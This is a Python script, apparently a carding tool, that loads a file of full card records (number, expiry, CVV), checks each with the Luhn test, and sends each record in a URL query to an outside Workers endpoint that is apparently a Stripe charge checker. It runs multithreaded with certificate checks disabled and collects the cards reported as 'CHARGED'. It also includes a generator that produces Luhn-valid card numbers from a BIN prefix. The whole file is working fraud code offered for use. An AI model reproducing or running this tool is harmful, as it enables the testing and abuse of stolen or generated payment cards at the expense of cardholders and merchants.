import requests
import time
import random
import string
import sys
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print_lock = threading.Lock()
results_lock = threading.Lock()
charged_cards = []

def calculate_luhn(number):
    digits = [int(d) for d in str(number)]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 0:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return (10 - (checksum % 10)) % 10

def validate_luhn(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    digits = [int(d) for d in card_number]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0

def generate_card_number(bin_str, length=16):
    card_num = str(bin_str)
    card_num = ''.join(filter(str.isdigit, card_num))
    while len(card_num) < length - 1:
        card_num += str(random.randint(0, 9))
    check_digit = calculate_luhn(card_num)
    return card_num + str(check_digit)

def check_card_stripe(card, index, total):
    url = f"https://stripe.melmelmel.workers.dev/?card={card}"
    try:
        resp = requests.get(url, timeout=30, verify=False)
        data = resp.json()
        status = data.get("status", "ERROR")
        msg = data.get("message", "No message")
        return (index, total, card, status, msg, 0.0)
    except Exception as e:
        return (index, total, card, "ERROR", str(e)[:40], 0.0)

def process_card(args):
    card, index, total = args[:3]
    
    # Pre-validation
    card_number = card.split('|')[0]
    if not validate_luhn(card_number):
        return (index, total, card, 'ERROR', 'INVALID_LUHN', 0.0)
    
    return check_card_stripe(card, index, total)

def main():
    if len(sys.argv) < 2:
        print("Usage: python autoshopify.py <cc_file.txt> [threads]", flush=True)
        sys.exit(1)
    
    cc_file = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    
    try:
        with open(cc_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip() and '|' in line and len(line.split('|')) >= 4]
    except FileNotFoundError:
        print(f"File not found: {cc_file}", flush=True)
        sys.exit(1)
    
    if not cards:
        print("No valid cards found", flush=True)
        sys.exit(1)
    
    total = len(cards)
    print(f"Loaded {total} cards | Threads: {threads}", flush=True)
    print("=" * 60, flush=True)
    
    tasks = [(card, i, total) for i, card in enumerate(cards, 1)]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(process_card, task): task for task in tasks}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                idx, tot, card_display, res_status, res_msg, res_price = result[:6]
                
                if res_status == 'CHARGED':
                    with results_lock:
                        charged_cards.append(card_display)
                    emoji = '✅'
                elif res_status == 'DECLINED':
                    emoji = '❌'
                else:
                    emoji = '⚠️'
                
                with print_lock:
                    print(f"[{idx}/{tot}] {card_display} | {res_msg} | {res_status} {emoji}", flush=True)
                
            except Exception as e:
                with print_lock:
                    print(f"Thread error: {e}", flush=True)
    
    print("=" * 60, flush=True)
    print(f"Done! Charged: {len(charged_cards)}/{total}", flush=True)
    if charged_cards:
        print("\nCharged:", flush=True)
        for cc in charged_cards:
            print(f"  {cc}", flush=True)

if __name__ == "__main__":
    main()
